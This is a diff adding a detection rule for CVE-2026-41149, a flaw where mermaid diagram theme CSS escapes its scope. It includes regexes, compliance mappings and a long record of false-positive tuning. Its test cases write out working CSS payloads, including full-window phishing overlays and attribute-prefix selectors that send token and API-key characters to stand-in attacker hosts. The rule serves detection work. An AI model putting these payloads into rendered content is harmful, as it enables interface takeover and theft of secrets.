@@ -1,0 +1,351 @@
+title: "Diagram Theme Config Used to Inject Page-Wide CSS (scope escape, overlay, selector exfil)"
+id: ATR-2026-02602
+rule_version: 2
+status: "experimental"
+description: >
+  Detects CVE-2026-41149: a mermaid initialisation directive embedded in
+  agent-rendered content (`%%{init: {...}}%%`, or a mermaid.initialize call)
+  whose theme value carries CSS that ESCAPES the diagram's scope. Mermaid runs
+  themeCSS through stylis, which prefixes every selector with `#mermaid-<id>`;
+  a selector written `:not(&)` breaks out of that prefix and applies to the whole
+  document. From there the payload is a full-window phishing overlay or
+  character-at-a-time exfiltration through an attribute-prefix selector whose
+  background url() fires one request per guessed character.
+
+  THE PRECISION LINE, AND WHERE IT WAS DRAWN. `themeCSS` legitimately contains
+  CSS -- `themeCSS: '.node rect { fill: #222 }'` is the documented use, braces
+  and all -- so "contains CSS syntax" is not a signal, and an earlier draft of
+  this rule that fired on a brace pair inside the value was rejected on exactly
+  that benign twin before it was written down.
+
+  TWO FURTHER MARKERS WERE REMOVED IN ADVERSARIAL REVIEW (rule_version 2), each
+  on measured benign fire, and both removals are corrections of the threat model
+  rather than concessions:
+
+  1. `position:fixed` inside a diagram theme was claimed as a viewport-pinned
+     overlay. It is not one. Without the stylis escape, stylis prefixes the
+     selector with `#mermaid-<id>`, so the declaration is confined to the
+     diagram and covers nothing. What the marker actually selected was the
+     ordinary fullscreen/lightbox/zoom/print-watermark/pinned-legend feature that
+     docs sites build on purpose. Eleven independent benign inputs fired on it:
+     a VitePress fullscreen handler, an mkdocs-material manifest, a CHANGELOG
+     line, a vitest fixture, a minified bundle line, a Traditional-Chinese blog
+     post, a Stack Overflow answer explaining that this does NOT work, and
+     several cross-key constructions where the `position:fixed` was in a
+     neighbouring key entirely, because `[^\n]{0,200}` runs straight through the
+     closing quote of the themeCSS value. The overlay payload is still detected
+     when it is an attack, because an attack must carry the scope escape and the
+     escape is claimed. Only the escape is load-bearing.
+
+  2. The attribute-prefix selector was matched on ANY attribute name. Only
+     `[value^=` (and `$=` / `*=` on the same attribute) is claimed now, because
+     `value` is the one attribute that carries a secret the page did not choose
+     to publish, and matching on a value PREFIX is something no designer does --
+     the selector sees the server-rendered attribute, not what the user typed, so
+     it is useless for styling and useful only for guessing. Every other
+     attribute name produced benign fire and was removed: `[class^="icon-"]`
+     (icon sprites), `[id^="mermaid-"]` (scoping to mermaid's own generated
+     container), `[data-testid^="node-"]` (generated themes), `[name^="card"]`
+     and `[placeholder^=` (form-field icons), `[title^=` (step badges) -- all of
+     them next to a CDN `url()`, all of them leaking nothing. `[href^=` and
+     `[src^=` are excluded for the same reason: `a[href^="https"]` beside a
+     remote icon url() is a textbook stylesheet. Nine benign inputs fired on the
+     untyped version, including the author's own DELIBERATELY-UNCLAIMED
+     Google-Fonts `@import` the moment ANY ordinary prefix selector appeared
+     within 120 characters of it.
+
+  3. Condition 0's window is `[^\n%]`, not `[^\n]`, so it cannot run out of the
+     `%%{...}%%` directive and pick a marker out of the prose that follows it.
+     A mitigation note that shows a plain `%%{init}%%` line and then discusses
+     the escape in the next sentence was firing before this. MEASURED COST, and
+     it is the only one: a payload that puts a literal `%` (e.g. `width:100%`)
+     inside a fontFamily/altFontFamily value BEFORE the marker is now missed by
+     condition 0. The same payload inside `themeCSS` is still caught, by
+     condition 1, which carries no `%` bound -- verified on both, one fires and
+     one does not.
+
+  The remaining scope escape additionally requires a declaration block after it
+  (`:not(&) ... {`), because an escape with no rule body changes nothing; that
+  drops prose which merely names the marker after a `themeCSS:` colon.
+
+  A webfont `@import url('https://fonts.googleapis.com/...')` inside themeCSS is
+  a plausible legitimate use of the same mechanism and is DELIBERATELY NOT
+  CLAIMED -- it is a measured true negative, not an oversight.
+
+  Coverage check, re-run in review and CORRECTED. The only rule that mentions
+  mermaid, ATR-2026-01967, is scoped to DeepChat IPC/MCP registration -- that
+  part of the author's claim holds. What the author missed is a sibling from
+  this same sweep: ATR-2026-02704 detects the CSS attribute-selector
+  exfiltration primitive generically, and it fires on three of the four
+  exfil payloads here. It reached the same conclusion independently -- it only
+  claims SECRET-bearing attributes (`value`, `token`, `csrf`, `secret`,
+  `password`, `api_key`, `otp`) -- which is corroboration that the untyped
+  attribute match this rule shipped with was the wrong line. The exfil branch
+  here is therefore largely redundant with 02704 and is kept only for the
+  themeCSS-scoped ordering 02704 does not cover (url() before the selector).
+  The `:not(&)` stylis scope escape is this rule's own, and nothing else
+  detects it.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: "test"
+severity: high
+
+references:
+  owasp_llm:
+    - "LLM02:2025"
+  owasp_agentic:
+    - "ASI04:2026"
+  mitre_atlas:
+    - "AML.T0051 - LLM Prompt Injection"
+    - "AML.T0051.001 - Indirect"
+  cve:
+    - "CVE-2026-41149"
+
+compliance:
+  owasp_agentic:
+    - id: ASI04:2026
+      context: "Content the agent renders escapes the boundary it was given and takes over the surrounding interface, which is an agent output-handling failure rather than a model failure."
+      strength: primary
+  owasp_llm:
+    - id: LLM02:2025
+      context: "Insecure output handling: markup produced or relayed by the model reaches a renderer that grants it document-wide effect."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 requires resilience against attempts to manipulate system output; a diagram config that repaints the whole window is exactly such a manipulation, and detection is the control."
+      strength: primary
+    - article: "14"
+      context: "A full-window overlay defeats human oversight by design -- the operator sees the attacker's surface instead of the system's -- so detecting it is an Article 14 control."
+      strength: secondary
+    - article: "9"
+      context: "Rendered-output injection is a documented risk class for agent interfaces; these events are the Article 9 monitoring evidence."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: MG.2.3
+      context: "Runtime treatment for untrusted content reaching a rendering surface with more authority than intended."
+      strength: primary
+    - function: Map
+      subcategory: MP.5.1
+      context: "Catalogues CSS-only injection as a distinct risk from script injection, which existing rules already cover."
+      strength: secondary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "Detection events document the security of the output-rendering path as MEASURE 2.7 requires."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Clause 8.1 operational control over the rendering pipeline that turns model output into a user-facing surface."
+      strength: primary
+    - clause: "6.2"
+      context: "Preventing interface takeover and selector-based data exfiltration is an AIMS information security objective under clause 6.2."
+      strength: secondary
+    - clause: "8.4"
+      context: "Impact assessment under 8.4 must account for what a rendered artifact can do to the viewer; these events are the evidence for that path."
+      strength: secondary
+
+tags:
+  category: context-exfiltration
+  subcategory: rendered-output-injection
+  scan_target: both
+  confidence: medium
+
+agent_source:
+  type: llm_io
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  conditions:
+    - field: content
+      operator: regex
+      value: '%%\s*\{[^\n]{0,240}?\b(?:themeCSS|altFontFamily|fontFamily)\b["'']?\s*:\s*["''][^\n%]{0,200}?(?::not\s*\(\s*&[^\n{]{0,20}?\)[^\n]{0,40}?\{|\[\s*value\s*[\^$*]=[^\n]{0,60}?\{[^\n]{0,90}?url\s*\(\s*["'']?(?:https?:)?//|url\s*\(\s*["'']?(?:https?:)?//[^\n]{0,120}?\[\s*value\s*[\^$*]=)'
+      description: "Mermaid init directive whose theme value breaks the stylis scope with :not(&) and opens a rule body, or pairs a SECRET-BEARING attribute-prefix selector with a remote url()"
+    - field: content
+      operator: regex
+      value: '\bthemeCSS\b["'']?\s*:\s*["''][^\n]{0,200}?(?::not\s*\(\s*&[^\n{]{0,20}?\)[^\n]{0,40}?\{|\[\s*value\s*[\^$*]=[^\n]{0,60}?\{[^\n]{0,90}?url\s*\(\s*["'']?(?:https?:)?//|url\s*\(\s*["'']?(?:https?:)?//[^\n]{0,120}?\[\s*value\s*[\^$*]=)'
+      description: "A themeCSS value carrying the same two escape markers, in the JS/JSON config form"
+
+  condition: any
+  false_positives:
+    - "THE ONE REAL RESIDUAL, measured, and it is a whole class rather than one shape: ANY prose that reproduces the payload -- the theme key, a colon, a quote, then the stylis escape opening a rule body -- is textually identical to the attack, so no pattern separates them. Three independent constructions fire and are accepted: a CVE advisory quoting the payload, a CHANGELOG line announcing the fix, and a GitHub bug report using the escape as its reproduction case. It does not occur in 12,830 benign corpus samples or in 556 repo doc/skill files. This rule's own prose deliberately never reassembles that sequence, and that is verified: it does not fire on itself minus its test_cases"
+    - "A theme that loads a remote webfont AND matches on a value PREFIX (`[value^=`) in the same 120 characters for unrelated reasons -- constructible, never observed, and there is no styling reason to write it"
+    - "NOT a false positive any more, and recorded so it is not re-added: a mermaid theme that uses position:fixed for a fullscreen, lightbox, zoom, print-watermark or pinned-legend feature. Confined by stylis, harmless, and the marker was removed"
+    - "NOT a false positive any more, and recorded so it is not re-widened: [class^=], [id^=], [data-*^=], [name^=], [placeholder^=], [title^=] or [href^=] beside a remote url(). Those attributes carry no secret, so the selector-exfil primitive does not apply and the marker no longer matches them"
+
+response:
+  actions:
+    - alert
+    - snapshot
+  auto_response_threshold: high
+  message_template: >
+    [ATR-2026-02602] A diagram theme configuration carries CSS that leaves the
+    diagram's scope -- a stylis `:not(&)` escape opening a rule body, or a
+    secret-bearing attribute-prefix selector paired with a remote url(). Rendered
+    content can repaint the whole window or leak field values one character at a
+    time. Do not render until the source of this block is established.
+
+confidence: 70
+test_cases:
+  true_positives:
+    - input: "%%{init: {\"fontFamily\":\"x;a{b} :not(&){position:fixed;inset:0;background:#fff;z-index:9999}\"}}%%\nflowchart TD\n A-->B"
+      expected: triggered
+      description: "fontFamily value carrying a stylis scope escape and a full-window overlay"
+    - input: "%%{init:{\"themeCSS\":\".node{fill:#fff} :not(&) body{display:none}\"}}%%\ngraph LR; A-->B;"
+      expected: triggered
+      description: "themeCSS escaping scope to blank the host page"
+    - input: "%%{init:{\"themeCSS\":\"#top{position:fixed} :not(&) #top{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647}\"}}%%"
+      expected: triggered
+      description: "Viewport-covering overlay that ESCAPES scope -- the bare position:fixed form was withdrawn in review because stylis confines it to the diagram and it is the ordinary fullscreen feature"
+    - input: "%%{init:{\"themeCSS\":\"input[name=_token][value^=\\\"a\\\"]{background:url(https://attacker.tld/leak?c=a)}\"}}%%"
+      expected: triggered
+      description: "Attribute-prefix selector exfiltrating a CSRF token one character per request"
+    - input: "mermaid.initialize({ startOnLoad: true, themeCSS: '.n{fill:#fff} :not(&){position:fixed;inset:0}' });"
+      expected: triggered
+      description: "Same escape in the JS configuration form"
+    - input: "mermaid.initialize({ themeCSS: 'a{background:url(https://c2.example/x?k=)} input[value^=sk-]{color:red}' });"
+      expected: triggered
+      description: "Remote url() and attribute-prefix selector in the other order"
+    - input: "%%{init:{\"themeCSS\":\":not(&) body::before{content:'';position:fixed;inset:0;background:#fff url(https://evil.tld/phish.png);z-index:2147483647}\"}}%%\nflowchart TD\n A-->B"
+      expected: triggered
+      description: "The full CVE-2026-41149 overlay: scope escape, then a viewport-covering pseudo-element over the whole document"
+    - input: "%%{init:{\"themeCSS\":\"input[value^='sk-a']{background:url(//x.evil/?c=a)} input[value^='sk-b']{background:url(//x.evil/?c=b)}\"}}%%"
+      expected: triggered
+      description: "Alphabet enumeration against a value prefix with protocol-relative callbacks -- the exfiltration primitive as actually deployed"
+    - input: "mermaid.initialize({ themeCSS: \".n{fill:#fff} :not(&,.cluster){position:fixed;inset:0;background:#000}\" });"
+      expected: triggered
+      description: "Scope escape written with an argument list, :not(&,.cluster), to dodge a literal :not(&) match"
+    - input: "mermaid.initialize({themeCSS:\":not( & ) html{filter:invert(1);pointer-events:none}\"})"
+      expected: triggered
+      description: "Whitespace-padded escape reaching the html element"
+  true_negatives:
+    - input: "%%{init: {\"theme\":\"base\",\"themeVariables\":{\"primaryColor\":\"#1f77b4\"}}}%%\ngraph TD; A-->B;"
+      expected: not_triggered
+      description: "Ordinary mermaid theming"
+    - input: "%%{init: {\"theme\":\"base\",\"themeVariables\":{\"fontFamily\":\"Inter, Helvetica, Arial, sans-serif\"}}}%%"
+      expected: not_triggered
+      description: "fontFamily set to a real font stack"
+    - input: "mermaid.initialize({ startOnLoad: true, theme: 'dark', themeCSS: '.node rect { fill: #222; stroke: #888; } .edgeLabel { background: #111; }' });"
+      expected: not_triggered
+      description: "The documented themeCSS use, braces and all -- the twin that killed an earlier brace-based draft"
+    - input: "%%{init:{\"themeCSS\":\"@import url('https://fonts.googleapis.com/css2?family=Inter'); .node{font-family:Inter}\"}}%%"
+      expected: not_triggered
+      description: "Webfont import inside themeCSS -- deliberately not claimed"
+    - input: "mermaid.initialize({ themeCSS: '.cluster rect { background: url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=) }' });"
+      expected: not_triggered
+      description: "Inline data: URI background, no remote fetch"
+    - input: "mermaid.initialize({ themeCSS: '.node:not(.cluster) rect { stroke-dasharray: 4 }' });"
+      expected: not_triggered
+      description: ":not() used on a class, not on the stylis parent selector"
+    - input: "%%{init:{\"altFontFamily\":\"monospace\"}}%%\nsequenceDiagram\n A->>B: hi"
+      expected: not_triggered
+      description: "altFontFamily with a plain value"
+    - input: "```mermaid\nflowchart LR\n  Client-->API\n  API-->DB\n```"
+      expected: not_triggered
+      description: "A plain diagram with no init directive"
+    - input: "%%{init:{\"securityLevel\":\"loose\",\"theme\":\"neutral\"}}%%\nflowchart TD\n click A \"https://docs.example.com\" \"Open docs\""
+      expected: not_triggered
+      description: "securityLevel loose, which is common and deliberately not treated as a signal"
+    - input: ".site-header { position: fixed; top: 0; width: 100%; z-index: 40; }"
+      expected: not_triggered
+      description: "A stylesheet pinning a header, with no diagram config anywhere"
+    - input: "Mermaid passes themeCSS through stylis, which scopes rules to #mermaid-<id>. A selector written as :not(&) escapes that scope and applies to the whole page, so a diagram in untrusted markdown can cover the window."
+      expected: not_triggered
+      description: "Security writing describing this very attack in prose"
+    - input: "stylis prefixes every selector with the component scope. Nesting with & refers to the parent selector; :not(&) is occasionally used in test fixtures to assert the negation branch."
+      expected: not_triggered
+      description: "Library documentation naming the escape marker"
+    - input: "{\"themeCSS\":\".label text{font-size:14px} .node circle{stroke-width:2px}\",\"theme\":\"base\"}"
+      expected: not_triggered
+      description: "A theme editor persisting user CSS"
+    - input: "module.exports = { theme: { extend: { fontFamily: { sans: ['Inter var', 'ui-sans-serif'] } } } }"
+      expected: not_triggered
+      description: "Tailwind config with a fontFamily key"
+    - input: "mermaid.initialize({ themeCSS: '.node rect{fill:#eee}', theme: 'base' });\ndocument.querySelector('.mermaid').style.position = 'fixed';"
+      expected: not_triggered
+      description: "themeCSS and unrelated fixed positioning in the same snippet"
+    - input: "{\"themeCSS\":\".label text{font-size:14px}\",\"logo\":\"url(https://cdn.example.com/logo.svg)\"}"
+      expected: not_triggered
+      description: "A remote url() in a neighbouring key rather than inside themeCSS"
+    - input: "chart.fontFamily = 'Roboto, sans-serif';\n.watermark { position: fixed; bottom: 8px; right: 8px; opacity: .2; }"
+      expected: not_triggered
+      description: "Report generator setting a font and a fixed watermark separately"
+    - input: "mermaid.initialize({ startOnLoad: true, themeCSS: '.mermaid-fullscreen { position: fixed; inset: 0; background: #fff; z-index: 40; overflow: auto; }' });"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv01): docs-site fullscreen/lightbox feature for diagrams"
+    - input: "{\"mermaid\":{\"themeCSS\":\".node rect{fill:#fff}\"},\"lightbox\":{\"css\":\".dlg{position:fixed;inset:0}\"}}"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv02): position:fixed lives in a DIFFERENT key on the same line"
+    - input: "mermaid.initialize({ themeCSS: \"@import url('https://fonts.googleapis.com/css2?family=Inter&display=swap'); [class^='node'] { font-family: Inter, sans-serif; }\" });"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv03): the author's own declared-benign webfont import + an ordinary prefix selector"
+    - input: "mermaid.initialize({ themeCSS: '[id^=\"mermaid-\"] .node rect { fill: url(https://cdn.example.com/patterns.svg#hatch); }' });"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv04): scoping to mermaid's generated ids + a remote SVG paint server"
+    - input: "在 VitePress 設定裡加上 mermaid.initialize({ themeCSS: '.diagram-full { position: fixed; inset: 0; z-index: 50 }' }) 就能讓圖表全螢幕顯示。"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv05): Traditional Chinese blog post about a fullscreen diagram"
+    - input: "mermaid の themeCSS: \"[class^=\\\"cluster\\\"] rect { fill: url(https://assets.example.jp/bg.svg) }\" を使うとクラスタ背景を差し替えられます。"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv06): Japanese docs, prefix selector + CDN asset"
+    - input: "## 2.4.1\n- fix(diagrams): themeCSS: '.mermaid-modal{position:fixed;inset:0}' is no longer dropped when print styles are active (#4821)"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv07): CHANGELOG entry"
+    - input: "it('applies custom themeCSS', () => { render({ themeCSS: '.overlay{position:fixed;inset:0}' }); expect(document.querySelector('style').textContent).toContain('position:fixed'); });"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv08): vitest fixture in a renderer repo"
+    - input: "markdown_extensions:\n  mermaid:\n    themeCSS: \".md-typeset .mermaid-zoom{position:fixed;top:0;left:0;width:100vw;height:100vh}\""
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv09): mkdocs-material yaml manifest"
+    - input: "{\"name\":\"corp-dark\",\"themeCSS\":\"[data-testid^=\\\"node-\\\"] rect{stroke:#444} .edgePath path{stroke:url(https://static.example.com/grad.svg#g1)}\",\"version\":3}"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv10): generated theme JSON: test-id prefix selector + remote gradient"
+    - input: "mermaid.initialize({ themeCSS: '@media print { .watermark { position: fixed; bottom: 0; opacity: .15 } }' });"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv12): print watermark inside themeCSS"
+    - input: "In Emotion the compiler is stylis, the same one mermaid uses for themeCSS: ':not(&) is how you opt a rule out of the generated scope class', which is why nested selectors behave the way they do."
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv13): library prose that happens to put the marker right after the key"
+    - input: "%%{init:{\"theme\":\"base\",\"themeCSS\":\".fullscreen-diagram{position:fixed;inset:0;background:#fff}\"}}%%\nflowchart TD\n  A-->B"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv14): a real %%{init}%% directive using the site's own fullscreen class"
+    - input: "You can't set themeCSS: \"position:fixed\" on the container from inside the diagram; mermaid re-renders the SVG and the style is scoped away. Put it on the wrapper element instead."
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv15): Stack Overflow answer saying the thing does NOT work"
+    - input: "var t={themeCSS:\".n{fill:#eee}\",modal:\".m{position:fixed;top:0}\"};"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv16): minified bundle line, two unrelated keys"
+    - input: "%%{init: {\"fontFamily\":\"Inter\", \"themeCSS\":\".legend{position:fixed;right:8px;bottom:8px}\"}}%%\ngraph LR; A-->B;"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv17): legend pinned to the viewport, cross-key via condition 0"
+    - input: "Theme editor export:\n{\"themeCSS\":\"[class^=icon-]{background-image:url(https://icons.example.com/sprite.svg)}\",\"theme\":\"base\"}"
+      expected: not_triggered
+      description: "Adversarial-review benign twin (adv18): icon sprite: the single most common prefix-selector idiom in CSS"
+    - input: "{\"themeCSS\":\".node{fill:#fff}\",\"formCSS\":\"input[name^=card]{background:url(https://cdn.example.com/visa.svg)}\"}"
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-02): cross-key: form-field icon CSS in a neighbouring key"
+    - input: "mermaid.initialize({ themeCSS: 'input[name^=\"search\"]{background:url(https://cdn.example.com/magnifier.svg) no-repeat}' });"
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-03): credit-card / search field icon keyed off field name, a real CSS idiom"
+    - input: "%%{init:{\"fontFamily\":\"Inter\"}}%% — note that in themeCSS a selector like `:not(&)` followed by a block { } is stripped by our sanitiser."
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-05): docs about the mitigation"
+    - input: "const css = `[title^=\"${prefix}\"] { background-image: url(${cdn}//sprite.svg) }`; mermaid.initialize({ themeCSS: css });"
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-06): templated CSS where the marker is built in a variable, not literally next to themeCSS"
+    - input: "stylis test fixture: expect(serialize(compile('.a{:not(&){color:red}}'), stringify)).toBe('.a :not(.a){color:red;}')"
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-07): stylis' own unit test for the negation branch"
+    - input: "mermaid.initialize({ themeCSS: '.node:not(.done) rect{fill:#eee} .edgeLabel{background:url(https://cdn.example.com/paper.png)}' });"
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-08): :not() on a class plus an unrelated remote texture"
+    - input: "主題設定:themeCSS: '[placeholder^=\"請輸入\"]{background:url(https://cdn.example.tw/hint.svg)}' 用來給輸入框加提示圖示。"
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-09): Traditional Chinese: placeholder-prefix selector + CDN hint icon"
+    - input: "mermaid.initialize({ themeCSS: '@import url(https://fonts.gstatic.com/s/inter/v13/font.woff2); .node[title^=\"step\"] rect{stroke:#333}' });"
+      expected: not_triggered
+      description: "Adversarial-review round 2 benign twin (r2-10): webfont import then a title-prefix selector, no url in that block"
